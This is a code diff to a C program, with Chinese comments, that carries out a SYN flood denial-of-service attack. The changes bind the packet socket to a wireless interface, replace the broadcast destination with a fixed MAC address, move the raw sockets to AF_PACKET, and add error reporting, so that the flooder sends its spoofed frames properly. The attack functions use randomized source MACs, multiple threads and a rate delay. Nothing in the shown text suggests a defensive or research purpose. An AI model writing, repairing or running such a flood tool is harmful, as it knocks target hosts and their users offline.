@@ -119,6 +119,7 @@ void send_syn_flood(int raw_sock, uint32_t target_ip, uint16_t target_port,
     dest_addr.sll_family = AF_PACKET;
     dest_addr.sll_protocol = htons(ETH_P_IP);
     dest_addr.sll_halen = ETH_ALEN;
+	dest_addr.sll_ifindex = if_nametoindex("wlan0"); // 替换为实际的网络接口名称
 
     if (quiet_mode == 0) {
         printf("Starting SYN Flood attack...\n");
@@ -156,9 +157,17 @@ void send_syn_flood(int raw_sock, uint32_t target_ip, uint16_t target_port,
 
         // 生成随机MAC地址
         uint8_t src_mac[6];
+		uint8_t dest_mac[6];
+		dest_mac[0] = 0x00;
+		dest_mac[1] = 0x11;
+		dest_mac[2] = 0xA1;
+		dest_mac[3] = 0xBB;
+		dest_mac[4] = 0x60;
+		dest_mac[5] = 0x1C;
         generate_random_mac(src_mac);
         memcpy(eth->h_source, src_mac, ETH_ALEN);
-        memset(eth->h_dest, 0xff, ETH_ALEN); // 广播地址
+        memcpy(eth->h_dest, dest_mac, ETH_ALEN);
+
         eth->h_proto = htons(ETH_P_IP);
 
         // 设置目标地址的MAC
@@ -172,7 +181,11 @@ void send_syn_flood(int raw_sock, uint32_t target_ip, uint16_t target_port,
             if (quiet_mode == 0 && packets_sent % 100 == 0) {
                 printf("Sent %d SYN packets...\n", packets_sent);
             }
-        }
+        } else {
+			if (quiet_mode == 0) {
+				perror("sendto failed");
+			}
+		}
 
         // 延迟控制攻击速度
         if (delay_ms > 0) {
@@ -197,7 +210,7 @@ void *attack_thread(void *arg) {
 	while (always_on && attack_running) {
 		struct attack_params *params = (struct attack_params *)arg;
 
-		int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+		int raw_sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_TCP);
 		if (raw_sock == -1) {
 			perror("Failed to create raw socket in thread");
 			return NULL;
@@ -353,7 +366,7 @@ int main(int argc, char *argv[]) {
 
 	if (thread_count == 1) {
 		// 单线程模式
-		int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+		int raw_sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_TCP);
 		if (raw_sock == -1) {
 			perror("Failed to create raw socket");
 			printf("Please run as root or set capabilities: sudo setcap "
